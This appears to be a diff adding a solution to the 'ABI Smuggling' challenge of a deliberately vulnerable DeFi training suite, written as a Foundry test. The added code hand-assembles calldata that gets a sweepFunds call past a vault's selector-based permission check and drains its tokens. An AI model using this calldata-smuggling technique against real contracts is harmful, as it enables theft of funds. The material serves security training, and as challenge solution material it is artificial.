@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -73,7 +73,49 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes memory exploitPayload = _getExploitPayload();
+        (bool success, ) = address(vault).call(exploitPayload);
+    }
+
+    function _getExploitPayload() private view returns (bytes memory) {
+        // 1cff79cd
+        bytes4 executeSelector = vault.execute.selector;
+
+        // 0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
+        bytes memory executeTarget = abi.encodePacked(bytes12(0), address(vault));
+
+        // 0000000000000000000000000000000000000000000000000000000000000064
+        bytes memory actionDataPointer = abi.encodePacked(uint256(0x64));
+
+        // 0000000000000000000000000000000000000000000000000000000000000000
+        bytes memory fillerBytes = abi.encodePacked(bytes32(0));
+
+        // d9caed12
+        bytes4 withdrawSelector = vault.withdraw.selector;
+
+        // 0000000000000000000000000000000000000000000000000000000000000044
+        bytes memory actionDataLength = abi.encodePacked(uint256(0x44));
+
+        // 85fb709d
+        bytes4 sweepFundsSelector = vault.sweepFunds.selector;
+
+        // 00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea
+        bytes memory recoveryAddr = abi.encodePacked(bytes12(0), recovery);
+
+        // 0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
+        bytes memory erc20TokenAddr = abi.encodePacked(bytes12(0), address(token));
+
+        return abi.encodePacked(
+            executeSelector,
+            executeTarget,
+            actionDataPointer,
+            fillerBytes,
+            withdrawSelector,
+            actionDataLength,
+            sweepFundsSelector,
+            recoveryAddr,
+            erc20TokenAddr
+        );
     }
 
     /**
